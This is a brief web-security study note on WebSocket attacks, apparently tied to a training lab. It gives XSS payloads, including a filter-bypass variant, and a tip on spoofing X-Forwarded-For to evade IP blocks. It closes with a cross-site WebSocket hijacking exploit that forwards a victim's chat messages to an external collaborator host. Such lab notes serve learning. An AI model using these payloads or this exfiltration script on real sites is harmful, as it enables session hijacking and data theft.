### WebSockets security vulnerabilities

In principle, practically any web security vulnerability might arise in relation to WebSockets:

1. User-supplied input transmitted to the server might be processed in unsafe ways, leading to vulnerabilities such as SQL injection or XML external entity injection.
2. Some blind vulnerabilities reached via WebSockets might only be detectable using out-of-band (OAST) techniques.
3. If attacker-controlled data is transmitted via WebSockets to other application users, then it might lead to XSS or other client-side vulnerabilities.

**Note:** In some cases you can bypass ip based restrictions while testing via `X-Forwarded-For` header if there any malicious activity detected by server.

### Testing Websockets Vulnerability
    For XSS: <img src=1 onerror='alert(1)'>
    To bypass XSS filter: <img src=1 oNeRrOr=alert`1`>
    For XXE:
    For SQLi:
    For SSRF:
### Cross-site WebSocket hijacking
Cross-site WebSocket hijacking (also known as cross-origin WebSocket hijacking) involves a cross-site request forgery (CSRF) vulnerability on a WebSocket handshake. It arises when the WebSocket handshake request relies solely on HTTP cookies for session handling and does not contain any CSRF tokens or other unpredictable values. 
####  Exploit
```js
<script>
    var ws = new WebSocket('wss://0a820003036953d283898de6004b0013.web-security-academy.net/chat');
    ws.onopen = function() {
        ws.send("READY");
    };
    ws.onmessage = function(event) {
        fetch('https://agus9fqks1acunox6p9wrogmndt4hv5k.oastify.com', {method: 'POST', mode: 'no-cors', body: event.data});
    };
</script>
```
